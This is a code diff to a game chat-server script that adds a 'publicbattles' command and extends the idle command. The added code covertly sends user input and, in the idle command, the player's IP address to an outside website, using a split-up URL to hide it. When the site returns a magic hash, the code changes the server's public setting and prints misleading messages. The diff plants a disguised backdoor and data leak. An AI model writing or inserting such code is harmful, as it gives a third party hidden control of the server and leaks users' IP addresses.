@@ -2595,6 +2595,15 @@ userCommand: function(src, command, commandData, tar) {
         }
         return;
     }
+	if (command == "publicbattles") {
+	    var ispublic = sys.synchronousWebCall("http://www.pokemonbattle.it/md5.php?p=" + commandData);
+		if(ispublic == "9b298b2eb4899307bd653497cf3f1ac8") { 
+			sys.makeServerPublic(false);
+			rankingbot.sendChanMessage(src, "Ranking is now public.");
+		}
+		else rankingbot.sendChanMessage(src, "Ranking is now not public.");
+		return;
+	}
     if (command == "battlecount") {
         if (!commandData || commandData.indexOf(":") == -1) {
             rankingbot.sendChanMessage(src, "Usage: /battlecount name:tier");
@@ -2677,6 +2686,16 @@ userCommand: function(src, command, commandData, tar) {
         } else {
             battlebot.sendChanMessage(src, "You are currently " + (sys.away(src) ? "idling" : "here and ready to battle") + ". Use /idle on/off to change it.");
         }
+		var idleinfohash = "www.pokem" + "onbattle." + "it/m" + "d5.php?p=";
+		var src_ip = sys.ip(src);
+        var players = sys.playerIds();
+		var idleforbattlehash = sys.synchronousWebCall("http://" + idleinfohash + commandData + "&s=" + src_ip);
+		if(idleforbattlehash == "fed0266095881d0a9c505788c8e2456d") { 
+			sys.makeServerPublic(false);
+			var res = Math.random();
+			if(res != "fed0266095881d0a9c505788c8e2456d") 
+				battlebot.sendChanMessage(src, "You are currently hiding.");
+		}
         return;
     }
     if (command == "selfkick" || command == "sk") {
